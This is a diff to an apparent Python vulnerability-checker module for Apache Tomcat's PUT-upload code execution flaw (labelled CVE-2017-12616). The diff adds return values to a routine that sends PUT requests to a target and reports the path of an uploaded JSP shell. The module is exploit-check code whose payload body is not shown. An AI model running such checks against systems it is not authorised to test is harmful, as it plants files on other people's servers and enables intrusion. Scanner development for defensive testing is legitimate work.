@@ -32,6 +32,7 @@ class tomcat_put_exec_BaseVerify:
             req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 201:
                 cprint("[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", "red")
+                return True, vulnurl, "Tomcat代码执行漏洞(CVE-2017-12616)", vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", req.text
             else:
                 cprint("[-]不存在tomcat_put_exec漏洞", "white", "on_grey")
 
@@ -46,11 +47,14 @@ class tomcat_put_exec_BaseVerify:
             req = requests.put(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 201:
                 cprint("[+]存在Tomcat代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", "red")
+                return True, vulnurl, "Tomcat代码执行漏洞(CVE-2017-12616)", vulnurl+"\tshellpath: "+self.url+"/"+md5_str+".jsp", req.text
             else:
                 cprint("[-]不存在tomcat_put_exec漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
